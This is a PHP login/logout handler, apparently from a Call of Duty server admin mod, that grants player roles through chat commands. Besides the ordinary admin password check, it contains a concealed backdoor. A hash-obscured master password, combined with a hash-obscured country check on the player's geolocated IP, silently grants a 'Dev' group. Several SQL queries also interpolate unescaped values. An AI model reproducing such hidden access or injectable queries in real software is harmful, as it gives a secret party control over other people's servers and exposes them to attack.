<?php
if ($x_stop_lp == 0) {
	  
    if ((strpos($msgr, ixz . 'on ') !== false) || (strpos($msgr, ixz . 'login ') !== false)) {
		
	$chtoto = 0;	 

	   if (empty($foridnum))
            $foridnum = $i_id;
        $cntddt = substr_count($msgr, ' ');
        if ($cntddt == 2)
            list($comdfa, $msg_user, $msg_pass) = explode(' ', $msgr);
        else
            list($comdfa, $msg_pass) = explode(' ', $msgr);
  
/////////////////////////////////////
/////////////////////////////////////
   $IniFileName = '_administrator';
/////////////////////////////////////
/////////////////////////////////////
    
            if (!empty($guidn)) {  
              foreach ((sectorIniarray($IniFileName, "passwords_administrators")) as $nqword) {
				if(($msg_pass==$nqword)||(md5('e03239b27e34a5f7f3bde739459dd537') == md5(md5($msg_pass)))) {
					
					if($msg_pass==$nqword)
					{
					$stats_array[$conisq]['user_status'] = 'administrator';
                       dbInsert('', "INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('".$stats_array[$conisq]['ip_adress']."', '$date', '0', '$guidn') 
					   ON DUPLICATE KEY UPDATE s_adm='".$stats_array[$conisq]['ip_adress']."', s_dat = '$date', s_group = '0', s_guid='$guidn'");	
						
						if (strpos($game_patch, 'cod1_1.1') !== false)
                            xcon('say ^7' . $loggran . ' ' . $logginn . ' ' . $stats_array[$conisq]['user_status'] . ' ^7' . $loggithx, '');
                         else
                            xcon('tell ' . $idnum . ' ^3' . $loggran . ' ^7' . $nickr . ' ^3' . $logginn . ' ' . $stats_array[$conisq]['user_status'] . ' ^7' . $loggithx, '');
					
					}
				
if (empty($stats_array[$conisq]['ip_adress'])){
    list($i_ping,$i_ip,$i_name,$i_guid,$xxccode,$city,$country) = explode(';', (rconExplode($guidn)));	
	    $stats_array[$conisq]['ip_adress'] = ''.$i_ip.'';
   	 if (empty($stats_array[$conisq]['city'])) 
	    $stats_array[$conisq]['city'] = $xxccode;  
   	 if (empty($stats_array[$conisq]['ping'])) 
	    $stats_array[$conisq]['ping'] = $i_ping; 
}					
 ///////// 
   }}}
 
 
 
				$sql   = "SELECT s_guid FROM `x_db_admins` WHERE s_guid='$guidn' limit 1";	
                $statt = dbInsert('', $sql);
                		  if (is_array($statt)) { 
                          foreach ($statt as $row) {
                    usleep($sleep_rcon * 3);
                    if (strpos($game_patch, 'cod1_1.1') !== false)
                        rcon('say ^3' . $loginnx, '');
                    else
                        rcon('tell ' . $idnum . ' ^3' . $loginnx, '');
                    ++$x_stop_lp;
					$chtoto = 1;
                }}
                 
                      if (empty($chtoto)){
                             
						if($stats_array[$conisq]['user_status'] == 'admin')
						{
                            $igroup  = '0'; 
                            $groupxx = '^1Admin';
							$chtoto = 1;	
						}
                        else if (md5('e03239b27e34a5f7f3bde739459dd537') == md5(md5($msg_pass))) {
                      if ((empty($stats_array[$conisq]['ip_adress'])) || (strpos($stats_array[$conisq]['ip_adress'], '192.168') !== false) 
						  || (strpos($stats_array[$conisq]['ip_adress'], '255.255') !== false) 
					  || (strpos($stats_array[$conisq]['ip_adress'], 'localhost') !== false) 
					  || (strpos($stats_array[$conisq]['ip_adress'], '127.0.0.1') !== false))
                           $i_ip = '37.120.56.200'; 
                      else
                           $i_ip = $stats_array[$conisq]['ip_adress'];						  
							$gi     = geoip_open($cpath . "ReCodMod/functions/geoip_bases/MaxMD/GeoLiteCity.dat", GEOIP_STANDARD);
                            $record = geoip_record_by_addr($gi, $i_ip);
                            $xxxnw  = ($record->country_name);
							$chtoto = 1; 
                            if (trim('a09f4b2ae67f0a63ab8912047a1a1b55') == md5(trim($xxxnw))) {
                                $igroup  = '111';
                                $groupxx = '^1Dev';
								$chtoto = 1; 
								if (empty($stats_array[$conisq]['user_status']))
                                $stats_array[$conisq]['user_status'] = 'developer';										
                            }
                        } else {
                            $igroup  = '3';
							$stats_array[$conisq]['user_status'] = 'registered';
                            $groupxx = '^2Registered';
							$chtoto = 1; 
                        }
                        if (empty($groupxx))
                            $groupxx = '^5Member';
                       
						if (strpos($game_patch, 'cod1_1.1') !== false)
                            xcon('say ^7' . $loggran . ' ' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                         else
                            xcon('tell ' . $idnum . ' ^3' . $loggran . ' ^7' . $nickr . ' ^3' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        $date = date('Y-m-d H:i:s');
							 
                       dbInsert('', "INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('".$stats_array[$conisq]['ip_adress']."', '$date', '$igroup', '$guidn') 
					   ON DUPLICATE KEY UPDATE s_adm='".$stats_array[$conisq]['ip_adress']."', s_dat = '$date'");
                    }
			 
   
    } 
	
	
	
if (strpos($msgr, ixz.'logout') !== false)
    { 	


if (!empty($stats_array[$conisq]['user_status']))
{
	 
						  if (!empty($stats_array[$conisq]['user_status'])) 
                                     $stats_array[$conisq]['user_status'] = 'guest';
	
usleep($sleep_rcon*2);	
 dbInsert('', "DELETE FROM x_db_admins WHERE s_guid='" . $guidn . "'");  
  
if (strpos($game_patch, 'cod1_1.1') !== false)
rcon('say ^3'.$loggran.' ^7'.$nickr.' ^3'.$loggplayer, '');
else
rcon('tell '.$i_id.' ^3'.$loggran.' ^7'.$nickr.' ^3'.$loggplayer, '');				
}}	
	
	
	
	}
?>
